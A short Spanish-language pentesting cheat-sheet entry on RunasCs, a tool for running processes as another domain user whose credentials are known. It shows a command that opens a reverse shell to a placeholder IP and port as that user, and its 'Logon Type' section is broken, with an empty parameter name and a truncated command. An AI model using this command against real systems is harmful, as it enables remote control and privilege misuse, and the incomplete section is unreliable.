RunasCs es una herramienta que nos permite ejecutar ciertos procesos en el dominio a nombre de otro usuario, muy util cuando solo podemos acceder de forma  remota con un usuario, pero hay otro usuario mas privilegiado que nos interesa, incluso nos permite hacer una reverse shell a nombre de otro usuario, no el que esta loggeado por winrm, sino el que le indiquemos a RunasCs, (Es requisito tener sus credenciales obviamente).

## Reverse Shell

```ruby
./RunasCs.exe {usuario} {Password} "powershell.exe" -r {IP}:{PORT} 
```

### Logon Type

Para esto usamos el parametro ``

```ruby
./RunasCs.exe {usuario} {Password} "powershell.exe" -r {IP}:{PORT} --
```